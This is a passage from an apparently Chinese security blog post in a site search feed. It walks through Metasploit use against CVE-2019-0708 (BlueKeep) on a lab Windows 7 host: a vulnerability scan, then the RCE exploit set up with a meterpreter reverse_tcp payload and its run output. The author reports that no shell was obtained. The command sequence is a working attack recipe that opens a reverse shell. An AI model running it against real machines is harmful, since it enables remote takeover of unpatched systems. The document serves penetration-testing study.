+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf5 &gt; use  auxiliary/scanner/rdp/cve_2019_0708_bluekeep</span><br><span class="line">msf5 auxiliary(scanner/rdp/cve_2019_0708_bluekeep) &gt; <span class="built_in">set</span> rhost 192.168.220.130</span><br><span class="line">rhost =&gt; 192.168.220.130</span><br><span class="line">msf5 auxiliary(scanner/rdp/cve_2019_0708_bluekeep) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (auxiliary/scanner/rdp/cve_2019_0708_bluekeep):</span><br><span class="line"></span><br><span class="line">   Name             Current Setting  Required  Description</span><br><span class="line">   ----             ---------------  --------  -----------</span><br><span class="line">   RDP_CLIENT_IP    192.168.0.100    yes       The client IPv4 address to report during connect</span><br><span class="line">   RDP_CLIENT_NAME  rdesktop         no        The client computer name to report during connect, UNSET = random</span><br><span class="line">   RDP_DOMAIN                        no        The client domain name to report during connect</span><br><span class="line">   RDP_USER                          no        The username to report during connect, UNSET = random</span><br><span class="line">   RHOSTS           192.168.220.130  yes       The target host(s), range CIDR identifier, or hosts file with syntax <span class="string">&#x27;file:&lt;path&gt;&#x27;</span></span><br><span class="line">   RPORT            3389             yes       The target port (TCP)</span><br><span class="line">   THREADS          1                yes       The number of concurrent threads (max one per host)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Auxiliary action:</span><br><span class="line"></span><br><span class="line">   Name  Description</span><br><span class="line">   ----  -----------</span><br><span class="line">   Scan  Scan <span class="keyword">for</span> exploitable targets</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 auxiliary(scanner/rdp/cve_2019_0708_bluekeep) &gt; run</span><br><span class="line"></span><br><span class="line">[*] 192.168.220.130:3389  - Detected RDP on 192.168.220.130:3389  (Windows version: 6.1.7601) (Requires NLA: No)</span><br><span class="line">[+] 192.168.220.130:3389  - The target is vulnerable.</span><br><span class="line">[*] 192.168.220.130:3389  - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br><span class="line"></span><br><span class="line"><span class="comment"># The target is vulnerable，证明目标主机存在0708漏洞</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211105141241472.png" alt="image-20211105141241472"></p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 auxiliary(scanner/rdp/cve_2019_0708_bluekeep) &gt; use exploit/windows/rdp/cve_2019_0708_bluekeep_rce</span><br><span class="line">[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; <span class="built_in">set</span> rhost 192.168.220.130</span><br><span class="line">rhost =&gt; 192.168.220.130</span><br><span class="line">msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; <span class="built_in">set</span> rport 3389</span><br><span class="line">rport =&gt; 3389</span><br><span class="line">msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; <span class="built_in">set</span> target 4</span><br><span class="line">target =&gt; 4</span><br><span class="line">msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/rdp/cve_2019_0708_bluekeep_rce):</span><br><span class="line"></span><br><span class="line">   Name             Current Setting  Required  Description</span><br><span class="line">   ----             ---------------  --------  -----------</span><br><span class="line">   RDP_CLIENT_IP    192.168.0.100    yes       The client IPv4 address to report during connect</span><br><span class="line">   RDP_CLIENT_NAME  ethdev           no        The client computer name to report during connect, UNSET = random</span><br><span class="line">   RDP_DOMAIN                        no        The client domain name to report during connect</span><br><span class="line">   RDP_USER                          no        The username to report during connect, UNSET = random</span><br><span class="line">   RHOSTS           192.168.220.130  yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit</span><br><span class="line">   RPORT            3389             yes       The target port (TCP)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/x64/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  thread           yes       Exit technique (Accepted: <span class="string">&#x27;&#x27;</span>, seh, thread, process, none)</span><br><span class="line">   LHOST     192.168.220.139  yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   4   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - VMWare 15)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; show targets </span><br><span class="line"></span><br><span class="line">Exploit targets:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic targeting via fingerprinting</span><br><span class="line">   1   Windows 7 SP1 / 2008 R2 (6.1.7601 x64)</span><br><span class="line">   2   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - Virtualbox 6)</span><br><span class="line">   3   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - VMWare 14)</span><br><span class="line">   4   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - VMWare 15)</span><br><span class="line">   5   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - VMWare 15.1)</span><br><span class="line">   6   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - Hyper-V)</span><br><span class="line">   7   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - AWS)</span><br><span class="line">   8   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - QEMU/KVM)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.220.139:4444 </span><br><span class="line">[*] 192.168.220.130:3389 - Running automatic check (<span class="string">&quot;set AutoCheck false&quot;</span> to <span class="built_in">disable</span>)</span><br><span class="line">[*] 192.168.220.130:3389 - Using auxiliary/scanner/rdp/cve_2019_0708_bluekeep as check</span><br><span class="line">[+] 192.168.220.130:3389  - The target is vulnerable. The target attempted cleanup of the incorrectly-bound MS_T120 channel.</span><br><span class="line">[*] 192.168.220.130:3389  - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[+] 192.168.220.130:3389 - The target is vulnerable. The target attempted cleanup of the incorrectly-bound MS_T120 channel.</span><br><span class="line">[*] 192.168.220.130:3389 - Using CHUNK grooming strategy. Size 250MB, target address 0xfffffa8028600000, Channel count 1.</span><br><span class="line">[!] 192.168.220.130:3389 - &lt;---------------- | Entering Danger Zone | ----------------&gt;</span><br><span class="line">[*] 192.168.220.130:3389 - Surfing channels ...</span><br><span class="line">[*] 192.168.220.130:3389 - Lobbing eggs ...</span><br><span class="line">[*] 192.168.220.130:3389 - Forcing the USE of FREE<span class="string">&#x27;d object ...</span></span><br></pre></td></tr></table></figure>
+
+<p>还是没成功获取shell。</p>
+]]></content>
+      <categories>
+        <category>WEB安全</category>
       </categories>
   </entry>
 </search>
